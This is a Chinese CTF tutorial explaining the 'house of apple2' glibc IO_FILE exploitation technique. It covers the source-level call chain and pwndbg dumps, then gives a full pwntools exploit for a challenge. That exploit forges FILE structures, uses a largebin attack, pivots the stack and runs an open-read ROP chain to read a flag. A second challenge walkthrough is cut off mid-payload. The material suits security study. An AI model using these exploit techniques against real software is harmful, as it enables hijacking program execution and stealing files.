# house of apple2

### house of apple：

> House of apple 是[roderick](https://bbs.kanxue.com/user-> home-956675.htm)师傅提出的一种新的glibc中IO攻击方法，在glibc 2.35好像仍是堆题的通杀手法
>
> 原文提到了多条IO利用链，本文仅涉及其中利用_IO_wfile_overflow函数控制程序执行流的调用链的学习利用

‍

#### **适用版本：**

> glibc 2.23 -- 至今

‍

#### 利用条件:

>   * 可以进行一次任意地址写（通常是largebin attack）
>   * 可以触发 IO 流操作（包括但不限于：从`main`​函数返回、调用`exit`​函数、通过`__malloc_assert`​触发）
>

‍

#### 攻击方法：

>   * 获取libc地址和heap地址
>   * 劫持_IO_FILE的vtable和_wide_data，伪造结构体
>   * 触发 IO 流操作
>

‍

#### 源码分析：

在glibc 2.23版本，由于没有对vtable的地址合法性的检查，我们可以直接对vtable地址进行劫持

而从glibc 2.24开始，加入了对 vtable
指针的检查，IO_validate_vtable函数会检查vtable的合法性，并判断其地址是否在一个合法区间

    
    
    /* Perform vtable pointer validation.  If validation fails, terminate
       the process.  */
    static inline const struct _IO_jump_t *
    IO_validate_vtable (const struct _IO_jump_t *vtable)
    {
      /* Fast path: The vtable pointer is within the __libc_IO_vtables
         section.  */
      uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
      const char *ptr = (const char *) vtable;
      uintptr_t offset = ptr - __start___libc_IO_vtables;
      if (__glibc_unlikely (offset >= section_length))
        /* The vtable pointer is not in the expected section.  Use the
           slow path, which will terminate the process if necessary.  */
        _IO_vtable_check ();
      return vtable;
    }
    

但我们并非无法伪造vtable，将 vtable 指向的 _IO_jump_t 改成
_IO_wfile_jumps、_IO_wfile_jumps_mmap、_IO_wfile_jumps_maybe_mmap等jump类地址应该都会满足检测，然后就能调用到_IO_wfile_overflow

    
    
    void attribute_hidden
    _IO_vtable_check (void)
    {
    #ifdef SHARED
      /* Honor the compatibility flag.  */
      void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
    #ifdef PTR_DEMANGLE
      PTR_DEMANGLE (flag);
    #endif
      if (flag == &_IO_vtable_check)
        return;
      /* In case this libc copy is in a non-default namespace, we always
         need to accept foreign vtables because there is always a
         possibility that FILE * objects are passed across the linking
         boundary.  */
      {
        Dl_info di;
        struct link_map *l;
        if (_dl_open_hook != NULL
            || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
                && l->l_ns != LM_ID_BASE))
          return;
      }
    #else /* !SHARED */
      /* We cannot perform vtable validation in the static dlopen case
         because FILE * handles might be passed back and forth across the
         boundary.  Therefore, we disable checking in this case.  */
      if (__dlopen != NULL)
        return;
    #endif
      __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
    }
    

下面要利用的是_IO_wide_data结构体中_wide_vtable，和调用vtable里函数指针一样，在调用_wide_vtable虚表里面的函数时，也是使用宏去调用，但其没有关于vtable的合法性检查

    
    
    /* Extra data for wide character streams.  */
    struct _IO_wide_data
    {
      wchar_t *_IO_read_ptr;    /* Current read pointer */
      wchar_t *_IO_read_end;    /* End of get area. */
      wchar_t *_IO_read_base;    /* Start of putback+get area. */
      wchar_t *_IO_write_base;    /* Start of put area. */
      wchar_t *_IO_write_ptr;    /* Current put pointer. */
      wchar_t *_IO_write_end;    /* End of put area. */
      wchar_t *_IO_buf_base;    /* Start of reserve area. */
      wchar_t *_IO_buf_end;        /* End of reserve area. */
      /* The following fields are used to support backing up and undo. */
      wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */
      wchar_t *_IO_backup_base;    /* Pointer to first valid character of
                       backup area */
      wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */
      __mbstate_t _IO_state;
      __mbstate_t _IO_last_state;
      struct _IO_codecvt _codecvt;
      wchar_t _shortbuf[1];
      const struct _IO_jump_t *_wide_vtable;
    };
    

我们可以通过largebin attack劫持_IO_list_all处为我们的可控堆地址

就可劫持vtable为_IO_wfile_jumps等jumps类函数，以可以调用_IO_wfile_overflow

然后伪造_wide_data结构体，使_wide_vtable指向我们的可控堆地址

控制程序执行​IO​​​​流函数调用，最终调用到_IO_Wxxxxx函数即可控制程序的执行流

>
> _IO_WXXXXX系列函数的调用只有_IO_WSETBUF、_IO_WUNDERFLOW、_IO_WDOALLOCATE和_IO_WOVERFLOW，其中_IO_WDOALLOCATE和_IO_WOVERFLOW更适合构造利用的

‍

**利用_IO_wfile_overflow函数控制程序执行流：**

> 具体调用链：
>
> _IO_wfile_overflow --> _IO_wdoallocbuf --> _IO_WDOALLOCATE -->
> *(fp->_wide_data->_wide_vtable + 0x68)(fp)

**_IO_wfile_overflow函数源码：**

    
    
    wint_t
    _IO_wfile_overflow (FILE *f, wint_t wch)
    {
      if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
        {
          f->_flags |= _IO_ERR_SEEN;
          __set_errno (EBADF);
          return WEOF;
        }
      /* If currently reading or no buffer allocated. */
      if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
        {
          /* Allocate a buffer if needed. */
          if (f->_wide_data->_IO_write_base == 0)
        {
          _IO_wdoallocbuf (f);
          // ......
        }
        }
    }
    

需要满足

> f->_flags & _IO_NO_WRITES == 0
>
> f->_flags & _IO_CURRENTLY_PUTTING == 0
>
> f->_wide_data->_IO_write_base == 0

**_IO_wdoallocbuf函数源码：**

    
    
    void
    _IO_wdoallocbuf (FILE *fp)
    {
      if (fp->_wide_data->_IO_buf_base)
        return;
      if (!(fp->_flags & _IO_UNBUFFERED))
        if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)// _IO_WXXXX调用
          return;
      _IO_wsetb (fp, fp->_wide_data->_shortbuf,
                 fp->_wide_data->_shortbuf + 1, 0);
    }
    libc_hidden_def (_IO_wdoallocbuf)
    

需要满足

> fp->_wide_data->_IO_buf_base != 0
>
> fp->_flags & _IO_UNBUFFERED == 0

‍

结构体的具体布置配着例题说明，可以先看一下我们需要伪造的结构体：

**_IO_list_all** ​

    
    
    pwndbg> p *(struct _IO_FILE_plus *) 0x7fb48be1a6a0
    $4 = {
      file = {
        _flags = -72540025,
        _IO_read_ptr = 0x7fb48be1a723 <_IO_2_1_stderr_+131> "",
        _IO_read_end = 0x7fb48be1a723 <_IO_2_1_stderr_+131> "",
        _IO_read_base = 0x7fb48be1a723 <_IO_2_1_stderr_+131> "",
        _IO_write_base = 0x7fb48be1a723 <_IO_2_1_stderr_+131> "",
        _IO_write_ptr = 0x7fb48be1a723 <_IO_2_1_stderr_+131> "",
        _IO_write_end = 0x7fb48be1a723 <_IO_2_1_stderr_+131> "",
        _IO_buf_base = 0x7fb48be1a723 <_IO_2_1_stderr_+131> "",
        _IO_buf_end = 0x7fb48be1a724 <_IO_2_1_stderr_+132> "",
        _IO_save_base = 0x0,
        _IO_backup_base = 0x0,
        _IO_save_end = 0x0,
        _markers = 0x0,
        _chain = 0x7fb48be1a780 <_IO_2_1_stdout_>,
        _fileno = 2,
        _flags2 = 0,
        _old_offset = -1,
        _cur_column = 0,
        _vtable_offset = 0 '\000',
        _shortbuf = "",
        _lock = 0x7fb48be1ba60 <_IO_stdfile_2_lock>,
        _offset = -1,
        _codecvt = 0x0,
        _wide_data = 0x7fb48be198a0 <_IO_wide_data_2>,
        _freeres_list = 0x0,
        _freeres_buf = 0x0,
        __pad5 = 0,
        _mode = 0,
        _unused2 = '\000' <repeats 19 times>
      },
      vtable = 0x7fb48be16600 <_IO_file_jumps>
    }
    

**_IO_wide_data**

    
    
    pwndbg> p &_IO_wide_data_2
    $5 = (struct _IO_wide_data *) 0x7fb48be198a0 <_IO_wide_data_2>
    pwndbg> p *(struct _IO_wide_data *) 0x7fb48be198a0
    $6 = {
      _IO_read_ptr = 0x0,
      _IO_read_end = 0x0,
      _IO_read_base = 0x0,
      _IO_write_base = 0x0,
      _IO_write_ptr = 0x0,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _IO_state = {
        __count = 0,
        __value = {
          __wch = 0,
          __wchb = "\000\000\000"
        }
      },
      _IO_last_state = {
        __count = 0,
        __value = {
          __wch = 0,
          __wchb = "\000\000\000"
        }
      },
      _codecvt = {
        __cd_in = {
          step = 0x0,
          step_data = {
            __outbuf = 0x0,
            __outbufend = 0x0,
            __flags = 0,
            __invocation_counter = 0,
            __internal_use = 0,
            __statep = 0x0,
            __state = {
              __count = 0,
              __value = {
                __wch = 0,
                __wchb = "\000\000\000"
              }
            }
          }
        },
        __cd_out = {
          step = 0x0,
          step_data = {
            __outbuf = 0x0,
            __outbufend = 0x0,
            __flags = 0,
            __invocation_counter = 0,
            __internal_use = 0,
            __statep = 0x0,
            __state = {
              __count = 0,
              __value = {
                __wch = 0,
                __wchb = "\000\000\000"
              }
            }
          }
        }
      },
      _shortbuf = L"",
      _wide_vtable = 0x7fb48be160c0 <_IO_wfile_jumps>
    }
    

**_IO_wfile_jumps**

    
    
    pwndbg> p &_IO_wfile_jumps
    $7 = (const struct _IO_jump_t *) 0x7fb48be160c0 <_IO_wfile_jumps>
    pwndbg> p *(const struct _IO_jump_t *) 0x7fb48be160c0
    $8 = {
      __dummy = 0,
      __dummy2 = 0,
      __finish = 0x7fb48bc8c070 <_IO_new_file_finish>,
      __overflow = 0x7fb48bc86410 <__GI__IO_wfile_overflow>,
      __underflow = 0x7fb48bc85050 <__GI__IO_wfile_underflow>,
      __uflow = 0x7fb48bc838c0 <__GI__IO_wdefault_uflow>,
      __pbackfail = 0x7fb48bc83680 <__GI__IO_wdefault_pbackfail>,
      __xsputn = 0x7fb48bc868c0 <__GI__IO_wfile_xsputn>,
      __xsgetn = 0x7fb48bc8b330 <__GI__IO_file_xsgetn>,
      __seekoff = 0x7fb48bc857d0 <__GI__IO_wfile_seekoff>,
      __seekpos = 0x7fb48bc8e530 <_IO_default_seekpos>,
      __setbuf = 0x7fb48bc8a620 <_IO_new_file_setbuf>,
      __sync = 0x7fb48bc86720 <__GI__IO_wfile_sync>,
      __doallocate = 0x7fb48bc7ff10 <_IO_wfile_doallocate>,
      __read = 0x7fb48bc8b9b0 <__GI__IO_file_read>,
      __write = 0x7fb48bc8af40 <_IO_new_file_write>,
      __seek = 0x7fb48bc8a6f0 <__GI__IO_file_seek>,
      __close = 0x7fb48bc8a610 <__GI__IO_file_close>,
      __stat = 0x7fb48bc8af30 <__GI__IO_file_stat>,
      __showmanyc = 0x7fb48bc8f4a0 <_IO_default_showmanyc>,
      __imbue = 0x7fb48bc8f4b0 <_IO_default_imbue>
    }
    

‍

### 例题pwn_one

例题是经典的pwn_one

​  
![](./img/723778286315456482.png)  
​

开了沙箱，保护全开

‍

##### 程序分析：

​  
![](./img/7654319882921504769.png)  
​

首先程序会要求你输入一个在6-10之间的值赋给key，这个key是我们能申请多大堆块的依据

‍

**add:**

​  
![](./img/7533185156771013641.png)  
​

可以申请3种大小的堆块：

key✖0x110大小

key✖0x110+0x10大小

2✖key✖0x110大小

总的范围在0x660-0x1540，申请的都是largebin大小的堆块

‍

**delete:**

​  
![](./img/2982557288271305876.png)  
​

存在UAF漏洞

‍

**edit:**

​  
![](./img/5053456063021239485.png)  
​

​  
![](./img/3699406079441981213.png)  
​

只有一次编辑机会，执行完内容的read后unk_202010将被赋0，不再满足进入edit的if判断

‍

**show:**

​  
![](./img/7813460212639080825.png)  
​

只有一次泄露机会，且只能泄露0x10大小的数据

‍

##### 利用详解：

>   * **libc地址和heap地址的获取**
>   * **伪造IO结构体**
>   * **largebin attack，劫持_IO_list_all变量**
>   * **exit退出，触发IO调用**
>

‍

**libc地址和heap地址获取：**

    
    
    add(2) #0
    add(1) #1
    add(1) #2
    add(1) #3
    
    delete(0)
    delete(2)
    
    
    show(0)
    libc_base=l64()-0x1f2cc0
    li('libc_base = '+hex(libc_base))
    
    ru('\x00\x00')
    heap_base=u64(r(8).ljust(8,b"\x00"))-0x13c0
    li('heap_base = '+hex(heap_base))
    

​  
![](./img/2802883676477560342.png)  
​

‍

**伪造IO结构体：**

程序只给一次修改机会，所以我们无法像常规堆体模板那样直接将chunk2作为辅助堆块布置

    
    
    '''
    pl=p64(main_arena_1392)*2+p64(0)+p64(stderr-0x20)
    edit(0,pl.ljust(0x880,b'\x00'))
    add(3)
    '''
    

​  
![](./img/3432624022829251963.png)  
​

所以我们先将chunk2回收，使chunk0送入largebin

​  
![](./img/2945962029003038979.png)  
​

再次delete chunk2，再将其送入unsortedbin来准备largebin attack

​  
![](./img/1430647523758177416.png)  
​

    
    
    add(1) #chunk0->largebin
    delete(2) #chunk2->ub
    
    pl=...
    edit(0,pl.ljust(0x880,b'\x00'))
    

##### **apple模板详解：**

1.对_IO_list_all、_IO_wide_data、_IO_jump_t结构体的伪造

2.magic_gadget+orw构造栈迁移来读取flag不再赘述，想详细了解的师傅可以看一下winmt大师傅的文章：[[原创] CTF 中
glibc堆利用 及 IO_FILE 总结-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com
(kanxue.com)](https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_23)

    
    
    chunk0 = heap_base + 0x290 #fake_IO
    chunk2 = heap_base + 0x13c0
    orw_addr = chunk0 + 0xe0 + 0xe8 + 0x70
    lock = libc_base+0x1f5720
    magic_gadget = libc_base + libc.sym['svcudp_reply'] + 0x1a
    '''
    <svcudp_reply+26>:    mov    rbp,QWORD PTR [rdi+0x48]
    <svcudp_reply+30>:    mov    rax,QWORD PTR [rbp+0x18]
    <svcudp_reply+34>:    lea    r13,[rbp+0x10]
    <svcudp_reply+38>:    mov    DWORD PTR [rbp+0x10],0x0
    <svcudp_reply+45>:    mov    rdi,r13
    <svcudp_reply+48>:    call   QWORD PTR [rax+0x28]
    '''
    
    #open
    orw = b'./flag\x00\x00'
    orw += p64(pop_rdx12) + p64(0) + p64(chunk0 - 0x10)
    orw += p64(pop_rdi) + p64(orw_addr)
    orw += p64(pop_rsi) + p64(0)
    orw += p64(open_addr)
    #read
    orw += p64(pop_rdi) + p64(3)
    orw += p64(pop_rsi) + p64(orw_addr + 0x100)
    orw += p64(pop_rdx12) + p64(0x50) + p64(0)
    orw += p64(read_addr)
    #puts
    orw += p64(pop_rdi) + p64(orw_addr + 0x100)
    orw += p64(puts_addr)
    
    #_IO_list_all
    pl=p64(0)+p64(leave_ret)+p64(0)+p64(io_all-0x20) #2c0
    pl+=p64(0)*3 #2e0
    pl+=p64(orw_addr) #chunk0 + 0xe0 + 0xe8 + 0x70 -- _IO_save_base
    pl+=p64(0)*7
    pl+=p64(lock) #_lock
    pl+=p64(0)*2
    pl+=p64(chunk0 + 0xe0) #370: chunk0+0xe0 -- _IO_wide_data
    pl+=p64(0)*6
    pl+=p64(wfile)
    
    #_IO_wide_data
    pl+=p64(0)*0x1c
    pl+=p64(chunk0 + 0xe0 + 0xe8) #_IO_jump_t
    
    #_IO_jump_t
    pl+=p64(0)*0xd
    pl+=p64(magic_gadget)
    pl+=orw
    

‍

**伪造的_IO_FILE_plus结构体：**

    
    
    #_IO_list_all
    pl=p64(0)+p64(leave_ret)+p64(0)+p64(io_all-0x20) #2c0
    pl+=p64(0)*3 #2e0
    pl+=p64(orw_addr) #chunk0 + 0xe0 + 0xe8 + 0x70 -- _IO_save_base
    pl+=p64(0)*7
    pl+=p64(lock) #_lock
    pl+=p64(0)*2
    pl+=p64(chunk0 + 0xe0) #370: chunk0+0xe0 -- _IO_wide_data
    pl+=p64(0)*6
    pl+=p64(wfile) #__GI__IO_wfile_jumps
    

**_flags = ~(2 | 0x8 | 0x800)** ，若不需要控制rdi则可以直接赋0

**_IO_write_base、_IO_buf_base** 设置为0

**_wide_data** 布置为我们的可控堆地址，这里是chunk0+0xe0，指向我们对_IO_wide_data结构体布置的payload

**vtable** 劫持为jump类，这里我们布置为_IO_wfile_jumps

    
    
    pwndbg> p _IO_list_all
    $1 = (struct _IO_FILE_plus *) 0x7fae1847f680 <_IO_2_1_stderr_>
    pwndbg> p *(struct _IO_FILE_plus *) 0x5555557da290
    $2 = {
      file = {
        _flags = 0,
        _IO_read_ptr = 0x8a1 <error: Cannot access memory at address 0x8a1>,
        _IO_read_end = 0x0,
        _IO_read_base = 0x7fae182ded72 <__mpn_mul_n+114> "\311\303\017\037@",
        _IO_write_base = 0x0,
        _IO_write_ptr = 0x7fae1847f640 <_nl_global_locale+224> "\255!D\030\256\177",
        _IO_write_end = 0x0,
        _IO_buf_base = 0x0,
        _IO_buf_end = 0x0,
        _IO_save_base = 0x5555557da4c8 "./flag", #orw_addr = fake_IO_addr + 0xe0 + 0xe8 + 0x70
        _IO_backup_base = 0x0,
        _IO_save_end = 0x0,
        _markers = 0x0,
        _chain = 0x0,
        _fileno = 0,
        _flags2 = 0,
        _old_offset = 0,
        _cur_column = 0,
        _vtable_offset = 0 '\000',
        _shortbuf = "",
        _lock = 0x7fae18481720 <_IO_stdfile_2_lock>,
        _offset = 0,
        _codecvt = 0x0,
        _wide_data = 0x5555557da370,    #原指向_IO_wide_data
        _freeres_list = 0x0,
        _freeres_buf = 0x0,
        __pad5 = 0,
        _mode = 0,
        _unused2 = '\000' <repeats 19 times>
      },
      vtable = 0x7fae18480020 <__GI__IO_wfile_jumps>
    }
    

**伪造的_IO_wide_data结构体：**

    
    
    #_IO_wide_data
    pl+=p64(0)*0x1c
    pl+=p64(chunk0 + 0xe0 + 0xe8) #_IO_jump_t
    

将_wide_vtable布置继续指向我们可控堆地址，这里就是我们伪造_IO_jump_t的payload部分

    
    
    pwndbg> p *(struct _IO_wide_data*) 0x5555557da370
    $3 = {
      _IO_read_ptr = 0x0,
      _IO_read_end = 0x0,
      _IO_read_base = 0x0,
      _IO_write_base = 0x0,
      _IO_write_ptr = 0x0,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _IO_state = {
        __count = 0,
        __value = {
          __wch = 0,
          __wchb = "\000\000\000"
        }
      },
      _IO_last_state = {
        __count = 0,
        __value = {
          __wch = 0,
          __wchb = "\000\000\000"
        }
      },
      _codecvt = {
        __cd_in = {
          step = 0x0,
          step_data = {
            __outbuf = 0x0,
            __outbufend = 0x0,
            __flags = 0,
            __invocation_counter = 0,
            __internal_use = 0,
            __statep = 0x0,
            __state = {
              __count = 0,
              __value = {
                __wch = 0,
                __wchb = "\000\000\000"
              }
            }
          }
        },
        __cd_out = {
          step = 0x0,
          step_data = {
            __outbuf = 0x0,
            __outbufend = 0x0,
            __flags = 0,
            __invocation_counter = 0,
            __internal_use = 0,
            __statep = 0x0,
            __state = {
              __count = 0,
              __value = {
                __wch = 0,
                __wchb = "\000\000\000"
              }
            }
          }
        }
      },
      _shortbuf = L"",
      _wide_vtable = 0x5555557da458     #原指向_IO_jump_t
    }
    

**伪造的_IO_jump_t结构体：**

    
    
    #open
    orw = b'./flag\x00\x00'
    orw += p64(pop_rdx12) + p64(0) + p64(chunk0 - 0x10)
    orw += p64(pop_rdi) + p64(orw_addr)
    orw += p64(pop_rsi) + p64(0)
    orw += p64(open_addr)
    #read
    orw += p64(pop_rdi) + p64(3)
    orw += p64(pop_rsi) + p64(orw_addr + 0x100)
    orw += p64(pop_rdx12) + p64(0x50) + p64(0)
    orw += p64(read_addr)
    #puts
    orw += p64(pop_rdi) + p64(orw_addr + 0x100)
    orw += p64(puts_addr)
    
    #_IO_jump_t
    pl+=p64(0)*0xd
    pl+=p64(magic_gadget)
    pl+=orw
    

_IO_wfile_doallocate布置为magic_gadget，会劫持rip寄存器，接下来栈迁移执行orw

若未开沙箱，则可直接劫持其为one_gadget

    
    
    pwndbg> p  *(const struct _IO_jump_t *) 0x5555557da458
    $4 = {
      __dummy = 0,
      __dummy2 = 0,
      __finish = 0x0,
      __overflow = 0x0,
      __underflow = 0x0,
      __uflow = 0x0,
      __pbackfail = 0x0,
      __xsputn = 0x0,
      __xsgetn = 0x0,
      __seekoff = 0x0,
      __seekpos = 0x0,
      __setbuf = 0x0,
      __sync = 0x0,
      __doallocate = 0x7fae183d42ba <svcudp_reply+26>,  #magic_gadget
      __read = 0x67616c662f2e,              #orw_start
      __write = 0x7fae183926e1 <__qgcvt+49>,
      __seek = 0x0,
      __close = 0x5555557da280,
      __stat = 0x7fae182b9aa2 <iconv+162>,
      __showmanyc = 0x5555557da4c8,
      __imbue = 0x7fae182c3c0a <__GI___gconv_create_spec+650>
    }
    

‍

**largebin attack，劫持IO**

进行largebin attack，并回收chunk2

    
    
    add(3) #largebin attack -> _IO_list_all: chunk2
    add(1) #recycle chunk2 -> _IO_list_all: chunk0
    

​  
![](./img/6818566665072023745.png)  
​

​  
![](./img/131005836738167729.png)  
​

‍

**触发IO调用**

    
    
    choice(5)
    

‍

‍

##### **触发流程：**

> **从__libc_start_call_main+111处步入**
>
> ‍
>
> **_IO_cleanup**
>
> ‍
>
> **_IO_flush_all_lockp**
>
> ‍
>
> **_IO_wfile_overflow**
>
> ​  
>
> ![](./img/3225410766966285306.png)  
>  ​
>
> ‍
>
> **_IO_wdoallocbuf**
>
> ‍
>
> **svcudp_reply+26**
>
> ‍
>
> **orw**

‍

​  
![](./img/8627283034540596005.png)  
​

‍

‍

##### **完整exp：**

    
    
    #encoding = utf-8
    from pwn import *
    from pwnlib.rop import *
    from pwnlib.context import *
    from pwnlib.fmtstr import *
    from pwnlib.util.packing import *
    from pwnlib.gdb import *
    from ctypes import *
    import os
    import sys
    import time
    import base64
    #from ae64 import AE64
    #from LibcSearcher import * 
    
    context.os = 'linux'
    context.arch = 'amd64'
    #context.arch = 'i386'
    context.log_level = "debug"
    
    
    local = 1
    binary = './pwn'
    ip = '0.0.0.0'
    port = 8888
    libcelf = './libc.so.6'
    ldfile = './ld.so'
    armmips = 0
    x64_32 = 1
    
    
    
    if x64_32:
        context.arch = 'amd64'
    else:
        context.arch = 'i386'
    
    if armmips==0:
        if local:
            if ldfile:
                p = process([ldfile, binary], env={"LD_PRELOAD":libcelf})
                libc = ELF(libcelf)
            elif libcelf:
                p = process([binary], env={"LD_PRELOAD":libcelf})
                libc = ELF(libcelf)
            else:
                p = process(binary)
        else:
            p = remote(ip,port)
    else:
        if local:
            if x64_32:
                p = process(["qemu-arm", "-g", "1212", "-L", "/usr/arm-linux-gnueabi",binary])
            else:
                p = process(["qemu-aarch64", "-g", "1212", "-L", "/usr/aarch64-linux-gnu/", binary])
        else:
            p = remote(ip,port)
    
    elf = ELF(binary)
    
    
    s       = lambda data               :p.send(data)
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data,num           :u32(p.recvuntil(data)[-num:].ljust(4,b'\x00'))
    uu64    = lambda data,num           :u64(p.recvuntil(data)[-num:].ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    context.terminal = ['gnome-terminal','-x','sh','-c']
    
    def dbg():
       gdb.attach(proc.pidof(p)[0])
       pause()
    
    bss = elf.bss()
    li('bss = '+hex(bss))
    
    add_idx = 1
    delete_idx = 2
    show_idx = 4
    edit_idx = 3
    
    
    def choice(cho):
        sla('enter your command: \n',cho)
    
    def add(idx):
        choice(add_idx)
        sla('choise:',idx)
    
    def delete(idx):
        choice(delete_idx)
        sla('Index: \n',idx)
    
    def show(idx):
        choice(show_idx)
        sla('Index: ',idx)
    
    def edit(idx,content):
        choice(edit_idx)
        sla('Index: ',idx)
        p.sendafter('Message: \n',content)
    
    ru('enter your key >>\n')
    sl('8')
    
    add(2) #0
    add(1) #1
    add(1) #2
    add(1) #3
    
    delete(0)
    delete(2)
    
    show(0)
    libc_base=l64()-0x1f2cc0
    li('libc_base = '+hex(libc_base))
    
    ru('\x00\x00')
    heap_base=u64(r(8).ljust(8,b"\x00"))-0x13c0
    li('heap_base = '+hex(heap_base))
    
    add(1) #chunk0->largebin
    
    delete(2) #chunk2->ub
    
    pop_rdi = libc_base + libc.search(asm('pop rdi;ret;')).__next__()
    pop_rsi = libc_base + libc.search(asm('pop rsi;ret;')).__next__()
    pop_rdx12 = libc_base + libc.search(asm('pop rdx;pop r12;ret;')).__next__()
    leave_ret = libc_base + libc.search(asm('leave;ret;')).__next__()
    
    open_addr = libc_base + libc.sym['open']
    read_addr = libc_base + libc.sym['read']
    puts_addr = libc_base + libc.sym['puts']
    
    stderr=libc_base+0x1f3680
    io_all = libc_base + libc.sym['_IO_list_all']
    li('io_all = '+hex(io_all))
    wfile = libc_base + libc.sym['_IO_wfile_jumps']
    li('wfile = '+hex(wfile))
    
    chunk0 = heap_base + 0x290 #fake_IO
    chunk2 = heap_base + 0x13c0
    orw_addr = chunk0 + 0xe0 + 0xe8 + 0x70
    lock = libc_base+0x1f5720
    magic_gadget = libc_base + libc.sym['svcudp_reply'] + 0x1a
    #magic_gadget = libc_base+0x16a1fa
    '''
    <svcudp_reply+26>:    mov    rbp,QWORD PTR [rdi+0x48]
    <svcudp_reply+30>:    mov    rax,QWORD PTR [rbp+0x18]
    <svcudp_reply+34>:    lea    r13,[rbp+0x10]
    <svcudp_reply+38>:    mov    DWORD PTR [rbp+0x10],0x0
    <svcudp_reply+45>:    mov    rdi,r13
    <svcudp_reply+48>:    call   QWORD PTR [rax+0x28]
    '''
    
    
    #open
    orw = b'./flag\x00\x00'
    orw += p64(pop_rdx12) + p64(0) + p64(chunk0 - 0x10)
    orw += p64(pop_rdi) + p64(orw_addr)
    orw += p64(pop_rsi) + p64(0)
    orw += p64(open_addr)
    #read
    orw += p64(pop_rdi) + p64(3)
    orw += p64(pop_rsi) + p64(orw_addr + 0x100)
    orw += p64(pop_rdx12) + p64(0x50) + p64(0)
    orw += p64(read_addr)
    #puts
    orw += p64(pop_rdi) + p64(orw_addr + 0x100)
    orw += p64(puts_addr)
    
    pl=p64(0)+p64(leave_ret)+p64(0)+p64(io_all-0x20) #2c0
    #_IO_list_all
    pl+=p64(0)*3 #2e0
    pl+=p64(orw_addr) #chunk0 + 0xe0 + 0xe8 + 0x70 -- _IO_save_base
    pl+=p64(0)*7
    pl+=p64(lock) #_lock
    pl+=p64(0)*2
    pl+=p64(chunk0 + 0xe0) #370: chunk0+0xe0 -- _IO_wide_data
    pl+=p64(0)*6
    pl+=p64(wfile) #__GI__IO_wfile_jumps
    #_IO_wide_data
    pl+=p64(0)*0x1c
    pl+=p64(chunk0 + 0xe0 + 0xe8) #_IO_jump_t
    #_IO_jump_t
    pl+=p64(0)*0xd
    pl+=p64(magic_gadget)
    pl+=orw
    
    edit(0,pl.ljust(0x880,b'\x00'))
    
    add(3) #largebin attack -> _IO_list_all: chunk2
    
    add(1) #recycle chunk2  -> _IO_list_all: chunk0
    
    #dbg()
    choice(5)
    
    
    itr()
    

‍

‍

### 例题house of cat

保护全开，开了沙箱

​  
![](./img/4489671373949733240.png)  
​

##### 程序分析：

限制申请大小 0x418-0x46f，限制修改次数两次并只能修改0x30字节

存在UAF漏洞，限制泄露数据最大大小为0x30字节

题目除了前面的加密，本身算是一道标准的菜单题，不过我们主要是要分析这道题里house of apple2手法如何利用，前面需要逆向的部分不再赘述

由于开了沙箱的缘故，我们需要构造orw来读取flag。此外，送入orw前还需要构造close(0)，将标准输入关闭掉，这样再次read的时候flag文件描述符就将是0，则可以正常read
flag文件

‍

##### 利用详解：

>   * **首先是泄露libc地址和heap地址**
>   * **伪造好结构体**
>   * **largebin attack攻击stderr指针**
>   * **修改top_chunk大小并触发IO调用**
>   * **进入 house of apple2 的调用链，通过_wide_data- >vtable跳转到提前布置好的地址进行栈迁移**
>   * **栈迁移后便已完全控制程序流，跳转执行rop链**
>

​ **libc地址和heap地址获取：**

    
    
    add(15,0x450,b'15s')
    add(14,0x450,b'14s')
    delete(15)
    add(13,0x460,b'13s')
    show(15)
    
    libc_base=l64()-0x21a0e0
    li(hex(libc_base))
    
    heap_base=u64(p.recvuntil("\x55")[-6:].ljust(8,b"\x00"))-0x290
    li(hex(heap_base))
    
    IO_list_all= libc_base + libc.sym['_IO_list_all']
    lock = libc_base+0x21ba60
    magic_gadget = libc_base+0x16a1fa
    wfile= libc_base + libc.sym['_IO_wfile_jumps']
    stderr = libc_base + libc.sym['stderr']
    
    open_addr = libc_base + libc.sym['open']
    read_addr = libc_base + libc.sym['read']
    write_addr = libc_base + libc.sym['write']
    close_addr= libc_base + libc.sym['close']
    pop_rax=libc_base+0x0000000000045eb0
    pop_rdi=libc_base+0x000000000002a3e5
    pop_rsi=libc_base+0x000000000002be51
    pop_rdx12=libc_base+0x000000000011f497
    leave_ret = libc_base + libc.search(asm('leave;ret;')).__next__()
    chunk0=heap_base+0xfc0
    orw_addr=chunk0 + 0xe0 + 0xe8 + 0x70
    li('orw_addr = '+hex(orw_addr))
    
    add(12,0x450,b'12s') #回收chunk
    

‍

​

**结构体的伪造：**

    
    
    pl=p64(0)*7
    pl+=p64(orw_addr)
    pl+=p64(0)*7
    pl+=p64(lock)
    pl+=p64(0)*2
    pl+=p64(chunk0 + 0xe0) 
    pl+=p64(0)*6
    pl+=p64(wfile)
    
    pl+=p64(0)*0x1c
    pl+=p64(chunk0 + 0xe0 + 0xe8)
    
    pl+=p64(0)*0xd
